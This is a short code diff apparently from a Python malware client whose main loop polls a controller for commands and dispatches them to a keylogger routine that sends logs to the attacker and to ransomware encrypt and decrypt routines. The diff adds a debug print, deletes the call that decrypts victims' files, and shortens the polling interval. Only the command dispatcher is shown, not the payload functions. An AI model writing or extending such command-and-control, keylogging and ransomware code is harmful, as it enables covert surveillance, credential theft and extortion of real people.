@@ -49,6 +49,7 @@ def main():
         result = result.split(" ")
 
         if result and len(result) >= 2:
+            print(result)
             if result[0] == "keylogger":
                 if result[1] == "send_log":
                     instructions.send_keylog_to_attacker()
@@ -67,7 +68,6 @@ def main():
                     ransomware.encrypt_ransomware()
                 elif result[1] == "decrypt":
                     instructions.download_secret_key()
-                    ransomware.decrypt_ransomware()
 
             if result != "no_data":
                 instructions.reset_instruction()
@@ -76,7 +76,7 @@ def main():
             break
 
         if next_step == "instructions":
-            sleep(10)
+            sleep(4)
 
 
 if __name__ == "__main__":
